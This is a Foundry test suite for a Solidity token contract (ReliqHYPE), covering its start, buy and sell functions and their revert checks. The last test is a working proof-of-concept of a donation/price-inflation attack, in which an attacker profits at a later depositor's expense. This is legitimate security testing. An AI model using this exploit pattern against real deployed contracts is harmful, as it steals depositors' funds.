// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import "../src/ReliqHYPE.sol";

// -----------------------------
// Mock Tokens
// -----------------------------
contract MockERC20 is ERC20 {
    constructor() ERC20("Mock Backing Token", "MOCK") {}

    function mint(address to, uint256 amt) external {
        _mint(to, amt);
    }
}

// -----------------------------
// Main Test Suite
// -----------------------------
contract ReliqHYPETest is Test {
    ReliqHYPE public rHYPE;
    MockERC20 public backing;

    address owner = address(this);
    address treasury = makeAddr("treasury");
    address u1 = makeAddr("u1");
    address u2 = makeAddr("u2");
    address u3 = makeAddr("u3");

    function setUp() public {
        // Label actors
        vm.label(owner, "Owner");
        vm.label(treasury, "Treasury");
        vm.label(u1, "u1");
        vm.label(u2, "u2");
        vm.label(u3, "u3");

        // Deploy contracts
        backing = new MockERC20();
        rHYPE = new ReliqHYPE(IERC20(address(backing)));

        // Mint backing to all parties
        uint256 mintAmt = 1_000_000 ether;
        backing.mint(owner, mintAmt);
        backing.mint(u1, mintAmt);
        backing.mint(u2, mintAmt);
        backing.mint(u3, mintAmt);

        // Approvals
        backing.approve(address(rHYPE), type(uint256).max);
        vm.startPrank(u1);
        backing.approve(address(rHYPE), type(uint256).max);
        vm.stopPrank();

        // Treasury
        rHYPE.setTreasuryAddress(treasury);
    }

    // -----------------------------
    // TEST: setStart()
    // -----------------------------
    function testSetStartInitializesProtocol() public {
        uint256 amount = 100 ether;
        uint256 burnAmount = 0 ether;

        rHYPE.setStart(amount, burnAmount);

        assertTrue(rHYPE.start(), "Protocol should mark as started");
        assertEq(backing.balanceOf(address(rHYPE)), amount, "Backing deposited");
        assertEq(rHYPE.totalSupply(), amount, "Minted supply should equal deposit");

        console.log("\n=== setStart ===");
        console.log("Backing:", rHYPE.getBacking());
        console.log("Asset Minted:", rHYPE.assetMinted());
        console.log("Max Mintable:", rHYPE.maxMintable());
        console.log("Last Price:", rHYPE.lastPrice());
    }

    // -----------------------------
    // TEST: buy()
    // -----------------------------
    function testBuy() public {
        rHYPE.setStart(1000 ether, 100 ether);
        rHYPE.setMaxMintable(100_000_000 ether);

        uint256 amount = 100 ether;

        // Pre-state
        uint256 u1AssetPre = rHYPE.balanceOf(u1);
        uint256 u1BackingPre = backing.balanceOf(u1);
        uint256 mintedPre = rHYPE.assetMinted();
        uint256 supplyPre = rHYPE.totalSupply();
        uint256 treasuryPre = backing.balanceOf(treasury);
        uint256 pricePre = rHYPE.lastPrice();

        // Action
        vm.prank(u1);
        rHYPE.buy(u1, amount);

        // Post-state
        uint256 u1AssetPost = rHYPE.balanceOf(u1);
        uint256 u1BackingPost = backing.balanceOf(u1);
        uint256 treasuryPost = backing.balanceOf(treasury);
        uint256 pricePost = rHYPE.lastPrice();

        // Checks
        assertGt(u1AssetPost, u1AssetPre, "u1 received assets");
        assertEq(u1BackingPre - u1BackingPost, amount, "u1 paid backing");
        assertEq(rHYPE.totalSupply() - supplyPre, u1AssetPost - u1AssetPre, "Supply increased correctly");
        assertGt(pricePost, pricePre, "Price should increase");

        uint256 expectedFee = (amount * 300 * 3000) / (10_000 * 10_000);
        assertApproxEqAbs(treasuryPost - treasuryPre, expectedFee, 1 wei, "Treasury received correct protocol fee");

        console.log("\n=== buy() ===");
        console.log("User asset +", u1AssetPost - u1AssetPre);
        console.log("User backing -", u1BackingPre - u1BackingPost);
        console.log("Treasury +", treasuryPost - treasuryPre);
        console.log("Price +", pricePost - pricePre);
    }

    // -----------------------------
    // TEST: sell()
    // -----------------------------
    function testSell() public {
        rHYPE.setStart(1000 ether, 100 ether);
        rHYPE.setMaxMintable(100_000_000 ether);

        uint256 amount = 100 ether;

        vm.startPrank(u1);
        rHYPE.buy(u1, amount);

        uint256 u1AssetPre = rHYPE.balanceOf(u1);
        uint256 u1BackingPre = backing.balanceOf(u1);
        uint256 treasuryPre = backing.balanceOf(treasury);
        uint256 supplyPre = rHYPE.totalSupply();
        uint256 pricePre = rHYPE.lastPrice();

        uint256 expectedAssetPreFee = rHYPE.AssetToBackingFloor(u1AssetPre);
        uint256 expectedAssetReceived = (expectedAssetPreFee * 9700) / 10000;
        uint256 expectedFeeToTreasury = ((expectedAssetPreFee - expectedAssetReceived) * 3000) / 10000;

        rHYPE.sell(u1AssetPre);
        vm.stopPrank();

        // assert user's asset has been burned.
        assertEq(rHYPE.balanceOf(u1), 0, "User burned all assets");

        // assert the user received expected amount of assets.
        assertApproxEqAbs(backing.balanceOf(u1) - u1BackingPre, expectedAssetReceived, 10 wei, "User received backing");

        // assert the treasury received expected fee.
        assertApproxEqAbs(
            backing.balanceOf(treasury) - treasuryPre, expectedFeeToTreasury, 1 wei, "Treasury received correct fee"
        );

        // assert the supply has been reduced by user's asset.
        assertEq(supplyPre - rHYPE.totalSupply(), u1AssetPre, "Supply reduced correctly");

        // assert the price has increased.
        assertGt(rHYPE.lastPrice(), pricePre, "Price has to increase");

        console.log("\n=== sell() ===");
        console.log("User received backing:", backing.balanceOf(u1) - u1BackingPre);
        console.log("Treasury received:", backing.balanceOf(treasury) - treasuryPre);
        console.log("Supply decreased by:", u1AssetPre);
        console.log("Price delta:", rHYPE.lastPrice() - pricePre);
    }

    function testStartAdversial() public {
        vm.expectRevert(); // cannot start with zero amounts
        rHYPE.setStart(0 ether, 0 ether);

        vm.expectRevert(); // burn amount cannot be higher than mint amount
        rHYPE.setStart(100 ether, 1000 ether);

        vm.prank(u1);
        vm.expectRevert(); // cannot be started by non-owner
        rHYPE.setStart(1000 ether, 100 ether);

        vm.prank(owner);
        rHYPE.setStart(1000 ether, 100 ether);
        vm.expectRevert(); // already started
        rHYPE.setStart(1000 ether, 100 ether);

        assertEq(rHYPE.start(), true, "Protocol started");
        assertEq(rHYPE.maxMintable(), 1000 ether, "Max mintable set");
        assertEq(rHYPE.totalSupply(), 1000 ether, "Total supply set");
        assertEq(rHYPE.lastPrice(), 1 ether, "Price set");
    }

    function testBuyAdversarial() public {
        // ────────────────────────────────────────────────
        // 1. Buying before protocol start should fail
        // ────────────────────────────────────────────────
        vm.startPrank(u1);
        vm.expectRevert("reHYPE: trading not started");
        rHYPE.buy(u1, 100 ether);
        vm.stopPrank();

        // ────────────────────────────────────────────────
        // 2. Initialize protocol
        // ────────────────────────────────────────────────
        vm.prank(owner);
        rHYPE.setStart(1000 ether, 100 ether);

        // ────────────────────────────────────────────────
        // 3. Buying more than maxMintable should revert
        // (maxMintable = 1000 ether right now)
        // ────────────────────────────────────────────────
        vm.expectRevert("reHYPE: exceeds max mintable");
        vm.prank(u1);
        rHYPE.buy(u1, 1 ether);

        // ────────────────────────────────────────────────
        // 4. Buying with 0 amount should revert
        // ────────────────────────────────────────────────
        vm.expectRevert("reHYPE: buy fee below minimum");
        vm.prank(u1);
        rHYPE.buy(u1, 0);

        // ────────────────────────────────────────────────
        // 5. Buying with receiver = 0x0 should revert
        // ────────────────────────────────────────────────
        vm.expectRevert("reHYPE: 0x0 forbidden receiver");
        vm.prank(u1);
        rHYPE.buy(address(0), 1 ether);

        // ────────────────────────────────────────────────
        // 6. Buying with dust amount (fee < DUST) should revert
        // ────────────────────────────────────────────────
        vm.expectRevert("reHYPE: buy fee below minimum");
        vm.prank(u1);
        rHYPE.buy(u1, 1 wei);

        // ────────────────────────────────────────────────
        // 7. minter tries to buy before being assigned — should fail
        // ────────────────────────────────────────────────
        address minter = makeAddr("minter");
        backing.mint(minter, 1000 ether);
        vm.startPrank(minter);
        backing.approve(address(rHYPE), type(uint256).max);
        vm.expectRevert("reHYPE: exceeds max mintable"); // same path — not yet masterMinter
        rHYPE.buy(minter, 1 ether);
        vm.stopPrank();

        // ────────────────────────────────────────────────
        // 8. Owner assigns master minter and re-attempts buy
        // ────────────────────────────────────────────────
        vm.prank(owner);
        rHYPE.setMasterMinter(minter);

        vm.startPrank(minter);
        uint256 preMaxMintable = rHYPE.maxMintable();
        uint256 prePrice = rHYPE.lastPrice();

        rHYPE.buy(u1, 100 ether);

        uint256 postMaxMintable = rHYPE.maxMintable();
        uint256 postPrice = rHYPE.lastPrice();
        vm.stopPrank();

        assertGt(postMaxMintable, preMaxMintable, "Master minter expanded maxMintable");
        assertGt(postPrice, prePrice, "Price must increase after successful buy");

        // ────────────────────────────────────────────────
        // 9. Regular user cannot exceed mint limit even after minter expansion
        // ────────────────────────────────────────────────
        vm.expectRevert("reHYPE: exceeds max mintable");
        vm.prank(u1);
        rHYPE.buy(u1, 900 ether); // large amount beyond cap

        // ────────────────────────────────────────────────
        // 10. Increase mint limit and perform a valid user buy
        // ────────────────────────────────────────────────
        vm.prank(owner);
        rHYPE.setMaxMintable(2000 ether);

        uint256 preBacking = backing.balanceOf(u1);
        uint256 preAsset = rHYPE.balanceOf(u1);

        vm.prank(u1);
        rHYPE.buy(u1, 100 ether);

        uint256 postBacking = backing.balanceOf(u1);
        uint256 postAsset = rHYPE.balanceOf(u1);
        uint256 finalPrice = rHYPE.lastPrice();

        assertEq(preBacking - postBacking, 100 ether, "u1 spent correct backing");
        assertGt(postAsset, preAsset, "u1 received asset tokens");
        assertGe(finalPrice, postPrice, "Price invariant upheld");
    }

    function testSellAdversarial() public {
        // ────────────────────────────────────────────────
        // 1. Attempt to sell before start
        // ────────────────────────────────────────────────
        vm.prank(u1);
        vm.expectRevert("reHYPE: trading not started");
        rHYPE.sell(100 ether);

        // ────────────────────────────────────────────────
        // 2. Initialize protocol and perform a buy so user has assets
        // ────────────────────────────────────────────────
        vm.prank(owner);
        rHYPE.setStart(1000 ether, 100 ether);
        rHYPE.setMaxMintable(100_000 ether);

        vm.startPrank(u1);
        rHYPE.buy(u1, 100 ether); // now u1 holds some rHYPE
        vm.stopPrank();

        uint256 u1Asset = rHYPE.balanceOf(u1);
        assertGt(u1Asset, 0, "user should own assets before sell");

        // ────────────────────────────────────────────────
        // 3. Attempt to sell 0 amount (invalid)
        // ────────────────────────────────────────────────
        vm.prank(u1);
        vm.expectRevert(); // zero input should revert, dust path
        rHYPE.sell(0);

        // ────────────────────────────────────────────────
        // 4. Attempt to sell more than owned
        // ────────────────────────────────────────────────
        vm.prank(u1);
        vm.expectRevert();
        rHYPE.sell(u1Asset + 1 ether);

        // ────────────────────────────────────────────────
        // 5. Attempt to sell when fee < DUST (spam prevention)
        // ────────────────────────────────────────────────
        // For a tiny token amount that produces < DUST fee
        vm.prank(u1);
        vm.expectRevert("reHYPE: sell fee below minimum");
        rHYPE.sell(1 wei);

        // ────────────────────────────────────────────────
        // 6. Perform a valid sell, ensure correct accounting
        // ────────────────────────────────────────────────
        uint256 preBacking = backing.balanceOf(u1);
        uint256 preSupply = rHYPE.totalSupply();
        uint256 prePrice = rHYPE.lastPrice();
        uint256 preTreasury = backing.balanceOf(treasury);

        vm.prank(u1);
        rHYPE.sell(u1Asset / 2); // half sell

        uint256 postBacking = backing.balanceOf(u1);
        uint256 postSupply = rHYPE.totalSupply();
        uint256 postPrice = rHYPE.lastPrice();
        uint256 postTreasury = backing.balanceOf(treasury);

        // Validate outcome
        assertGt(postBacking, preBacking, "user received backing after sell");
        assertLt(postSupply, preSupply, "total supply should decrease");
        assertGt(postTreasury, preTreasury, "treasury received fee");
        assertGe(postPrice, prePrice, "price invariant (_upOnly) upheld");

        // ────────────────────────────────────────────────
        // 7. Attempt to sell full balance, ensure contract doesn't underflow
        // ────────────────────────────────────────────────
        vm.startPrank(u1);
        uint256 finalBal = rHYPE.balanceOf(u1);
        rHYPE.sell(finalBal);
        vm.stopPrank();

        assertEq(rHYPE.balanceOf(u1), 0, "user should be fully exited");
        assertGe(rHYPE.lastPrice(), postPrice, "price should not decrease");

        // ────────────────────────────────────────────────
        // 8. Selling after price changes or backing reduced should revert gracefully
        // (Simulate by reducing contract backing directly)
        // ────────────────────────────────────────────────
        vm.deal(address(backing), 0);
        vm.startPrank(owner);
        backing.transfer(address(0xdead), 1 ether); // simulate drop in backing
        vm.expectRevert(); // should revert due to insufficient backing
        vm.prank(u1);
        rHYPE.sell(1 ether);
        vm.stopPrank();
    }

    function testSellAdversarial_RandomBackingInjection() public {
        // ────────────────────────────────────────────────
        // 1. Initialize protocol & buy some assets
        // ────────────────────────────────────────────────
        vm.startPrank(owner);
        rHYPE.setStart(1000 ether, 100 ether);
        rHYPE.setMaxMintable(100_000 ether);
        vm.stopPrank();

        vm.startPrank(u1);
        rHYPE.buy(u1, 100 ether);
        vm.stopPrank();

        uint256 preBacking = rHYPE.getBacking();
        uint256 prePrice = rHYPE.lastPrice();

        // ────────────────────────────────────────────────
        // 2. Random actor injects backing tokens directly
        // ────────────────────────────────────────────────
        address random = makeAddr("random");
        backing.mint(random, 500 ether);

        vm.startPrank(random);
        backing.transfer(address(rHYPE), 500 ether); // direct transfer — bypassing buy()
        vm.stopPrank();

        uint256 postBacking = rHYPE.getBacking();
        uint256 postPrice = rHYPE.lastPrice();

        assertGt(postBacking, preBacking, "Backing increased from random injection");
        assertEq(postPrice, prePrice, "Price should not auto-update before sell/buy trigger");

        // ────────────────────────────────────────────────
        // 3. Existing holder sells after random injection
        // ────────────────────────────────────────────────
        uint256 userAssetBalPre = rHYPE.balanceOf(u1);
        uint256 userBackingBalPre = backing.balanceOf(u1);

        vm.startPrank(u1);
        rHYPE.sell(userAssetBalPre / 2);
        vm.stopPrank();

        uint256 userBackingBalPost = backing.balanceOf(u1);
        uint256 postPriceAfterSell = rHYPE.lastPrice();

        // ────────────────────────────────────────────────
        // 4. Assertions: behavior must stay sane
        // ────────────────────────────────────────────────
        assertGt(userBackingBalPost, userBackingBalPre, "User still receives backing correctly");
        assertGe(rHYPE.getBacking(), preBacking, "Backing accounting consistent post-sell");
        assertGe(postPriceAfterSell, postPrice, "Price invariant holds after random injection");
        assertEq(rHYPE.totalBorrowed(), 0, "No false loan created from random deposit");

        // ────────────────────────────────────────────────
        // 5. Cleanup: ensure liquidity invariant consistent
        // ────────────────────────────────────────────────
        uint256 contractBalance = backing.balanceOf(address(rHYPE));
        uint256 expectedBacking = rHYPE.getBacking() - rHYPE.totalBorrowed();
        assertEq(contractBalance, expectedBacking, "Backing accounting invariant preserved");
    }

    // Demonstrates donation / price-inflation attack: attacker mints a DUST-compliant
    // amount, reduces their balance to 1 wei, donates backing directly to the contract
    // (bypassing `buy`) to inflate the relHYPE price, then sells at the inflated price.
    function testDonationInflationAttack() public {
        // initialize protocol
        vm.prank(owner);
        rHYPE.setStart(1000 ether, 0);
        rHYPE.setMaxMintable(1_000_000 ether);

        // attacker (u1) performs a larger buy so downstream sells pass DUST checks
        uint256 buyAmount = 1 ether;
        vm.prank(u1);
        rHYPE.buy(u1, buyAmount);

        // attacker transfers away all but 1 wei of their relHYPE balance to u2
        uint256 attackerBal = rHYPE.balanceOf(u1);
        assertGt(attackerBal, 1, "attacker must hold >1 wei after buy");
        uint256 keep = 1;
        uint256 send = attackerBal - keep;
        vm.prank(u1);
        rHYPE.transfer(u2, send);

        // u1 transfers all but 1 wei to u2
        uint256 u2Asset = rHYPE.balanceOf(u2);
        // (recompute u2Asset from transfer above)
        u2Asset = rHYPE.balanceOf(u2);

        // u2 sells their large balance
        uint256 u2BackingPre = backing.balanceOf(u2);
        uint256 sellAmt = rHYPE.balanceOf(u2);
        vm.prank(u2);
        rHYPE.sell(sellAmt);
        uint256 u2BackingPost = backing.balanceOf(u2);
        assertGt(u2BackingPost, u2BackingPre, "u2 gained backing from sell");

        // Record u1 backing before donation and withdrawing 1 wei
        uint256 u1BackingPreWithdraw = backing.balanceOf(u1);

        // Capture expected mint for u3 if NO donation had occurred (using current contract state)
        uint256 depositAmount = 100 ether;
        uint256 expectedPreAsset = rHYPE.BackingToAssetFloor(depositAmount);
        uint256 expectedPreMint = (expectedPreAsset * (rHYPE.FEE_BASE_BPS() - rHYPE.buyFeeBPS())) / rHYPE.FEE_BASE_BPS();

        // DONATION: attacker (or another actor) donates backing directly to the contract
        // This happens AFTER u2's sell and BEFORE u3's buy so only u1's remaining 1 wei benefits.
        vm.prank(u1);
        backing.transfer(address(rHYPE), 100_000 ether);

        // Victim u3 deposits (buys) after the donation
        uint256 u3AssetPre = rHYPE.balanceOf(u3);
        vm.prank(u3);
        backing.approve(address(rHYPE), type(uint256).max);
        vm.prank(u3);
        rHYPE.buy(u3, depositAmount);
        uint256 u3AssetPost = rHYPE.balanceOf(u3);
        uint256 received = u3AssetPost - u3AssetPre;

        // Log and assert: u3 should receive fewer tokens than expected if no donation occurred
        console.log("expectedPreMint:", expectedPreMint);
        console.log("received:", received);
        assertLt(received, expectedPreMint, "later depositor received fewer tokens due to attack");

        // Check: can u3 immediately withdraw (sell) their newly bought tokens?
        uint256 u3BackingPreSell = backing.balanceOf(u3);
        vm.prank(u3);
        rHYPE.sell(u3AssetPost);
        uint256 u3BackingPostSell = backing.balanceOf(u3);
        assertGt(u3BackingPostSell, u3BackingPreSell, "u3 can withdraw after buy");

        // Now attacker u1 withdraws their remaining 1 wei and should capture the donation benefit
        vm.prank(u1);
        rHYPE.sell(1);
        uint256 u1BackingPostWithdraw = backing.balanceOf(u1);

        // Attacker u1 should have gained backing from withdrawing the 1 wei after donation+u3 deposit
        assertGt(u1BackingPostWithdraw, u1BackingPreWithdraw, "attacker gained backing from withdrawing 1 wei");

        // Expected tokens if no inflation (just fee applied): ~100 * (1 - 0.03)
        uint256 expectedNoInflation = (100 ether * (rHYPE.FEE_BASE_BPS() - rHYPE.buyFeeBPS())) / rHYPE.FEE_BASE_BPS();
        assertLt(received, expectedNoInflation, "later depositor received fewer tokens due to attack");
    }
}
